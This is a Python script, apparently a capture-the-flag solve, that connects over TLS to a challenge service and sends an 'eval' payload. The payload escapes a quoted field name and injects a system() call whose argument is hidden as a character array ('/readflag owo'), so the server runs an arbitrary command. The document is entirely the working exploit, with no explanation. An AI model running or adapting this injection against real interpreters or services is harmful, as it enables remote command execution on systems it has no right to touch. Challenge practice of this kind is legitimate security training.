import json
import socket
import ssl
from pathlib import Path


root = Path(__file__).resolve().parents[1]
endpoint = json.loads((root / "instance.json").read_text())["endpoints"][0]
sock = ssl.create_default_context().wrap_socket(
    socket.create_connection((endpoint["host"], endpoint["port"]), timeout=10),
    server_hostname=endpoint["host"],
)
sock.settimeout(8)
data = b""
while b"y> " not in data:
    data += sock.recv(4096)
source = r'let m = {x: 1}; print(m."x\x22); system((char[]){47,114,101,97,100,102,108,97,103,32,111,119,111,0}); y_map_get(_m,\x22x");'
sock.sendall(("eval " + source + "\n").encode())
try:
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
except (TimeoutError, OSError):
    pass
print(repr(data[-12000:]))
